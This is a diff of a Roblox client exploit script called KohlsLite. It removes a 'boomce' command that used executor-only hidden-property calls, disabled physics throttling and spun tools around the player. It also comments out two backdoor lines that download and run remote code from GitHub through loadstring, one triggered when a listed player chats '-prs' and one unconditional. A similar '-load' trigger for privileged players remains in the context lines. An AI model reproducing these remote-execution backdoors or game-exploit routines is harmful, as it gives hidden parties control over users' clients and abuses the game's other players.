@@ -61,7 +61,7 @@ I know this script is inconsistent with the fact it uses Game with and without G
 -- Notifications
 local function Remind(msg)
         game.StarterGui:SetCore("SendNotification", {
-                Title = "KohlsLite traig",
+                Title = "KohlsLite v1.861",
                 Text = msg,
                 Duration = 1
         })
@@ -2069,140 +2069,8 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
 		end
       end
 
- if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'boomce' then
-		SuperCMD(prefix.."gear me boombox")
-
-		local Physics = game:GetService("PhysicsSettings")
-                pcall(function()
-                	sethiddenproperty(char.Humanoid, "InternalBodyScale", Vector3.new(9e9,9e9,9e9))
-               	 	sethiddenproperty(workspace, "SignalBehavior", "Immediate")
-                	Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
-                	Physics.AllowSleep = false
-                	Physics.ThrottleAdjustTime = math.huge
-                end)
-		-- Circa command
-		task.wait(0.5)
-                local tools = {}
-
-		backpack = game.Players.LocalPlayer.Backpack
-		char = game.Players.LocalPlayer.Character
-		chart = game.Players.LocalPlayer.Character.Humanoid
-		
-	 	for _, v in next, backpack:GetChildren() do
-                    if v:IsA("Tool") then
-                        table.insert(tools, v)
-                        chart:EquipTool(v)
-                        chart:UnequipTools()
-                    end
-                end
-
-	        for _, v in next, backpack:GetChildren() do
-                    if v:IsA("Tool") then
-                        v.Parent = char
-                        v.Parent = backpack
-                        v.Parent = chart
-                        v.Parent = char
-                    end
-                end
-
-		--local numTools = #tools
-		local stackHeight = 0 
-		local stackOffset = Vector3.new(0, stackHeight, 0)
-
-		-- Root = game.Players.LocalPlayer.Character.HumanoidRootPart
-
-		--Root = game.Players[game.Players.LocalPlayer.Name].Character.HumanoidRootPart.Position
-
-                for i, v in pairs(tools) do
-                	local BodyPos = Instance.new("BodyPosition", v.Handle)
-                    	BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-                    	BodyPos.D = 1250
-                    	BodyPos.P = 1000
-                    	local BodyGy = Instance.new("BodyGyro", v.Handle)
-                    	BodyGy.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
-                    --[[	task.spawn(function()
-                    		while task.wait() do
-                    			BodyGy.P = 1000
-                    		end
-                    	end) ]]
- 
-                    v.Handle.Position = v.Handle.Position + (i - 1) * stackOffset
-
-				local Speed
-               			local Height
-				local Angle
-               			local targetPos
-               			local Radius
-                		local Base
-				local Root = game.Players[game.Players.LocalPlayer.Name].Character.HumanoidRootPart.Position
-					
-				Speed = 5
-				Height = 0
-				Base = (tick() * 15 * Speed)
-				Angle = math.rad(Base + (i * (360 / #tools)))
-				Radius = 5
-                    		stackHeight = 0
-
-				local targetPos = Root + Vector3.new(
-                                math.cos(Angle) * Radius,
-                                Height + (i - 1) * stackHeight,
-                                math.sin(Angle) * Radius
-                                ) + Vector3.new(0,0,0)
-
-				v.Handle.BodyPosition.Position = targetPos
-                		v.Handle.BodyGyro.CFrame = CFrame.new(v.Handle.Position, Root) * CFrame.Angles(0, 0, 0)
-                end
-
-			--[[
-	        for i, v in next, char:GetChildren() do
-                    	if v:FindFirstChild("Handle") then
-				local Speed
-               			local Height
-				local Angle
-               			local targetPos
-               			local Radius
-                		local Base
-				local Root = game.Players[game.Players.LocalPlayer.Name].Character.HumanoidRootPart.Position
-					
-				Speed = 5
-				Height = 0
-				Base = (tick() * 15 * Speed)
-				Angle = math.rad(Base + (i * (360 / #tools)))
-				Radius = 5
-                    		stackHeight = 0
-
-				local targetPos = Root + Vector3.new(
-                                math.cos(Angle) * Radius,
-                                Height + (i - 1) * stackHeight,
-                                math.sin(Angle) * Radius
-                                ) + Vector3.new(0,0,0)
-
-				v.Handle.BodyPosition.Position = targetPos
-				print("e1")
-                		v.Handle.BodyGyro.CFrame = CFrame.new(v.Handle.Position, Root) * CFrame.Angles(0, 0, 0)
-				print("e2")
-			end
-		end]]
-
-		task.wait(0.5)
-
-		-- Bcirca command
-        	local check = string.sub(msg:lower(), #prefix + 8, #prefix + 8)
-	   	if check == "g" then
-			local idrinkrum = string.sub(msg, #prefix + 9) ; task.wait(0)
-			myplay = musictable[idrinkrum].id
-	    	else
-			myplay = string.sub(msg:lower(), 8 + #prefix)
-	    	end
-		song = tonumber(myplay)
-			
-		for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-    			if v:IsA("Tool") then
-        			pcall(function()
-            				v.Remote:FireServer("PlaySong",song)
-        			end)
-   		 	end
-		end
+      if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'boomce' then
+		Remind("i give up")
       end
 
       if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'bcirca' then -- .supercmd .gear me boombox -> .circa -> .bcirca
@@ -10215,12 +10083,12 @@ function PLRSTART(v)
                             Execute(string.sub(msg, 6))
                         end
                     end
-
+--[[
                     if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
 	                if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                         	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
 			end
-                    end
+                    end]]
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                         if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
@@ -15053,7 +14921,7 @@ Stats.rank = rankcheck(Stats.username)
 print("Your rank is: " .. Stats.rank)
 
 -- atprog's funny thing ...
-loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
+-- loadstring(game:HttpGet("https://raw.githubusercontent.com/blueskykah/soggy/main/for%20atpoop"))()
 
 -- Atprog billboard gui --
 local function createBillboardGui(text, color)
